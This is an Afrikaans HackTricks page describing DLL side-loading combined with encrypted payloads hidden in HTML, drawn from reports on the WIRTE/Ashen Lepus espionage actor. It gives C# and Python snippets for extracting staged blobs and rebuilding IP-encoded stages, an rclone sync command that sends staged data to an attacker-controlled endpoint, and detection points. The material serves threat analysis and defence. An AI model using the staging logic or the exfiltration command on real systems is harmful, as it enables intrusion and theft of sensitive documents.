# Gevorderde DLL Side-Loading met HTML-ingebedde Payload-staging

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig van Tradecraft

Ashen Lepus (ook bekend as WIRTE) het ’n herhaalbare patroon as wapen gebruik wat DLL sideloading, gefaseerde HTML-payloads en modulêre .NET-backdoors kombineer om ’n vastrapplek in diplomatieke netwerke in die Midde-Ooste te behou. Enige operateur kan die tegniek hergebruik omdat dit op die volgende staatmaak:<sup>[[1]](#references)</sup>

- **Argiefgebaseerde social engineering**: onskadelike PDF’s gee teikens opdrag om ’n RAR-argief vanaf ’n lêerdelingwebwerf af te laai. Die argief bevat ’n dokumentkyker-EXE wat eg lyk, ’n kwaadwillige DLL wat na ’n vertroude biblioteek vernoem is (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en ’n lokmiddel-`Document.pdf`.
- **Misbruik van die DLL-soekvolgorde**: die slagoffer dubbelklik die EXE, Windows laai die DLL-invoer vanaf die huidige gids, en die kwaadwillige loader (AshenLoader) word binne die vertroude proses uitgevoer terwyl die lokmiddel-PDF oopmaak om agterdog te vermy.
- **Living-off-the-land-staging**: elke daaropvolgende stadium (AshenStager → AshenOrchestrator → modules) bly van die skyf af totdat dit nodig is, en word afgelewer as geënkripteerde blobs wat in andersins onskadelike HTML-antwoorde versteek is.

## Multi-stadium Side-Loading-ketting

1. **Lokmiddel-EXE → AshenLoader**: die EXE laai AshenLoader via sideloading, waarna dit host recon uitvoer, dit met AES-CTR enkripteer en dit POST in wisselende parameters soos `token=`, `id=`, `q=` of `auth=` na API-agtige paaie (bv. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML-onttrekking**: die C2 verklap die volgende stadium slegs wanneer die kliënt-IP na die teikenstreek geolokaliseer word en die `User-Agent` met die implant ooreenstem, wat sandboxes frustreer. Wanneer die kontroles slaag, bevat die HTTP-liggaam ’n `<headerp>...</headerp>`-blob met die Base64/AES-CTR-geënkripteerde AshenStager-payload.
3. **Tweede sideload**: AshenStager word ontplooi saam met ’n ander wettige binêre lêer wat `wtsapi32.dll` invoer. Die kwaadwillige kopie wat in die binêre lêer ingespuit is, haal meer HTML op en haal dié keer AshenOrchestrator uit `<article>...</article>`.
4. **AshenOrchestrator**: ’n modulêre .NET-beheerder wat ’n Base64 JSON-konfigurasie dekodeer. Die konfigurasie se `tg`- en `au`-velde word aaneengeskakel/gehash om die AES-sleutel te vorm, wat `xrk` dekripteer. Die resulterende grepe dien as ’n XOR-sleutel vir elke module-blob wat daarna opgehaal word.
5. **Module-aflewering**: elke module word beskryf deur HTML-kommentaar wat die ontleder na ’n arbitrêre tag herlei, en sodoende statiese reëls omseil wat net vir `<headerp>` of `<article>` soek. Modules sluit volharding (`PR*`), verwyderaars (`UN*`), verkenning (`SN`), skermvaslegging (`SCT`) en lêerverkenning (`FE`) in.

### HTML-houer-ontledingspatroon

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Selfs al blokkeer of verwyder verdedigers ’n spesifieke element, hoef die operateur net die merker te verander waarna die HTML-opmerking verwys om aflewering te hervat.<sup>[[1]](#references)</sup>

### Vinnige onttrekkingshulp (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML-stagingontduikingsparallelle

Onlangse navorsing oor HTML-smuggling (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhegsels versteek en tydens looptyd met JavaScript gedekodeer word.<sup>[[2]](#references)</sup> Dieselfde truuk kan vir C2-antwoorde hergebruik word: plaas geënkripteerde blobs binne ’n script-tag (of ander DOM-element) en dekodeer dit in geheue voor AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde verduistering (hernoeming van identifiseerders plus Base64/Caesar/AES) binne script-tags, wat goed pas by HTML-geopgestelde C2-blobs.<sup>[[2]](#references)</sup> ’n Latere Talos-artikel oor **hidden text salting** is ook hier relevant: om Base64 met irrelevante HTML-kommentaar of witspasie op te breek, is genoeg om eenvoudige regex-ekstraktors te fnuik terwyl rekonstruksie aan die blaaierskant eenvoudig bly.<sup>[[7]](#references)</sup>

## Onlangse variantnotas (2024-2025)

- Check Point het WIRTE-veldtogte in 2024 waargeneem wat steeds op argiefgebaseerde sideloading berus het, maar `propsys.dll` (stagerx64) as die eerste stadium gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (sleutel `53`), stuur HTTP-versoeke met ’n hardgekodeerde `User-Agent` en onttrek geënkripteerde blobs wat tussen HTML-tags ingebed is. In een tak is die stadium uit ’n lang lys ingebedde IP-stringe gerekonstrueer, wat met `RtlIpv4StringToAddressA` gedekodeer en daarna tot die payload-grepe aaneengeskakel is.<sup>[[3]](#references)</sup>
- OWN-CERT het vroeëre WIRTE-gereedskap gedokumenteer waarin die sy-gelaaide `wtsapi32.dll`-dropper stringe met Base64 + TEA beskerm het en die DLL-naam self as die dekripsiesleutel gebruik het. Daarna het dit gasheeridentifikasiedata met XOR/Base64 verduister voordat dit na die C2 gestuur is.<sup>[[4]](#references)</sup>

## Rekonstruksie van IP-geënkodeerde stadiums

WIRTE se `propsys.dll`-tak van 2024 wys dat die volgende PE nie as een aaneenlopende HTML-blob hoef voor te kom nie. Die loader kan stadiumgrepe as dotted-quad-stringe stoor en dit met `RtlIpv4StringToAddressA` herbou, ’n patroon wat nou verband hou met Hive se **IPfuscation**-werkwyse.<sup>[[3]](#references)[[5]](#references)</sup> Operasioneel is dit nuttig wanneer die akteur wil hê dat die HTML-bladsy eerder skynbaar onskadelike IOCs of konfigurasiedata as ’n ooglopende Base64-payload moet bevat.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

As die herstelde grepe met `MZ` begin, het jy waarskynlik die volgende PE direk gerekonstrueer. Indien nie, kyk vir ’n voorste XOR/Base64-laag of klein skeidingsgrepe tussen adresse.

## Verwisselbare DLL-name en host-rotasie

’n Belangrike eienskap van hierdie patroon is dat die **HTML/AES/XOR-staging-backend onveranderd kan bly terwyl net die sideload-paar verander**. WIRTE het oor verskillende veldtogte tussen `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` en `propsys.dll` gewissel, wat nuttig is omdat:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` en `wtsapi32.dll` is alledaagse Windows-DLL-name wat verdedigers verwag om in `%System32%` / `%SysWOW64%` te vind.
- Openbare katalogusse soos **HijackLibs** koppel reeds baie binaries aan hierdie DLL-name wanneer hulle vanaf ’n gekopieerde toepassingsgids gelaai word. Dit gee operators vervangende hosts sonder dat die stager herontwerp hoef te word.
- Net die export-oppervlak moet vir elke host aangepas word. Die HTML-parser, AES/XOR-roetines en modulelaaier kan gewoonlik onveranderd na ’n forwarding proxy DLL oorgedra word.

Vir offensiewe laboratoriumwerk beteken dit dat jy die probleem in twee dele kan opdeel: **(1) vind ’n stabiele, ondertekende host wat jou gekose DLL-naam plaaslik oplos** en **(2) hergebruik dieselfde staged-HTML-laaierlogika agter daardie DLL**.

## Crypto- en C2-verharding

- **Oral AES-CTR**: huidige laaiers bevat 256-bis-sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg soms ’n XOR-laag met stringe soos `msasn1.dll` voor/na dekripsie by.<sup>[[1]](#references)</sup>
- **Variante in sleutelmateriaal**: vroeëre laaiers het Base64 + TEA gebruik om ingebedde stringe te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL-naam (bv. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Verdeelde infrastruktuur + subdomein-kamoeflering**: staging-bedieners word per instrument geskei, oor verskillende ASN’e gehuisves en soms deur geloofwaardige subdomeine aangebied, sodat die blootlegging van een stage nie die res blootlê nie.
- **Verkenningsdata-smokkelary**: die geïnventariseerde data bevat nou Program Files-lyste om waardevolle toepassings te vind, en word altyd geënkripteer voordat dit die host verlaat.
- **URI-wisseling**: navraagparameters en REST-paaie wissel tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose opsporingsreëls ongeldig maak.
- **Vasgepende User-Agent + veilige herleidings**: C2-infrastruktuur reageer net op presiese UA-stringe en herlei andersins na geloofwaardige nuus-/gesondheidswebwerwe om onopvallend te bly.
- **Beheerde aflewering**: bedieners gebruik geo-afbakening en reageer net op regte implants. Nie-goedgekeurde kliënte ontvang onverdagte HTML.

## Volharding- en uitvoeringslus

AshenStager laat geskeduleerde take agter wat hulle as Windows-instandhoudingstake voordoen en via `svchost.exe` loop, bv.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie take begin die sideloading-ketting weer met opstart of met tussenposes, sodat AshenOrchestrator nuwe modules kan aanvra sonder om weer aan die skyf te raak.

## Gebruik van onskadelike Sync-kliënte vir data-uitfiltrering

Operators plaas diplomatieke dokumente met ’n toegewyde module in `C:\Users\Public` (wêreldleesbaar en onverdacht), en laai dan die wettige [Rclone](https://rclone.org/)-binary af om daardie gids met aanvallerberging te sinchroniseer. Unit42 merk op dat dit die eerste keer is dat hierdie akteur Rclone vir data-uitfiltrering gebruik; dit strook met die breër tendens om wettige sync-nutsgoed te misbruik om by normale verkeer in te meng:<sup>[[1]](#references)</sup>

1. **Staging**: kopieer/versamel teikenlêers na `C:\Users\Public\{campaign}\`.
2. **Konfigureer**: verskaf ’n Rclone-konfigurasie wat na ’n aanvallerbeheerde HTTPS-endpoint wys (bv. `api.technology-system[.]com`).
3. **Sinchroniseer**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos gewone wolkrugsteun lyk.

Omdat Rclone wyd vir wettige rugsteunwerkvloeie gebruik word, moet verdedigers op afwykende uitvoerings fokus (nuwe binaries, vreemde remotes of skielike sinchronisering van `C:\Users\Public`).

## Opsporingspunte

- Waarsku oor **ondertekende prosesse** wat onverwags DLL’s vanaf gebruiker-skryfbare paaie laai (Procmon-filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name met `netutils`, `srvcli`, `dwampi`, `wtsapi32` of `propsys` ooreenstem.<sup>[[6]](#references)</sup>
- Ondersoek verdagte HTTPS-antwoorde vir **groot Base64-blokke wat in ongewone tags ingebed is** of deur `<!-- TAG: <xyz> -->`-kommentaar beskerm word.
- Normaliseer HTML eers: **verwyder kommentaar en vou witspasie saam voor Base64-onttrekking**, omdat ontwykingstegnieke met versteekte tekssouting loonvragte oor kommentaargrense kan verdeel.
- Brei HTML-soektogte uit na **Base64-stringe binne `<script>`-blokke** (HTML-smuggling-staging) wat deur JavaScript gedekodeer word voor AES/XOR-verwerking.
- Soek na herhaalde oproepe na **`RtlIpv4StringToAddressA` gevolg deur buffer-samestelling**, veral wanneer die omliggende stringe lang IPv4-lyste is eerder as werklike netwerkteikens.
- Soek na **geskeduleerde take** wat `svchost.exe` met nie-diensargumente uitvoer of na dropper-gidse wys.
- Volg **C2-herleidings** wat net loonvragte vir presiese `User-Agent`-stringe terugstuur en andersins na wettige nuus-/gesondheidsdomeine herlei.
- Monitor vir **Rclone**-binaries buite IT-bestuurde liggings, nuwe `rclone.conf`-lêers of sync-take wat data uit staging-gidse soos `C:\Users\Public` oordra.

## References

- [1] [Ashen Lepus, verbonde aan Hamas, teiken diplomatieke instellings in die Midde-Ooste met die nuwe AshTag-malwarepakket](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Versteek tussen die tags: insigte in ontduikingstegnieke in HTML-smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Die Hamas-verbonde bedreigingsakteur WIRTE sit sy bedrywighede in die Midde-Ooste voort en beweeg na ontwrigtende aktiwiteite](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Op soek na verlore tyd](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware gebruik nuwe IPfuscation-tegniek om opsporing te vermy](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Moontlike sideloading van stelsel-DLL’s vanaf nie-stelselliggings](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Geur e-posbedreigings met versteekte tekssouting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
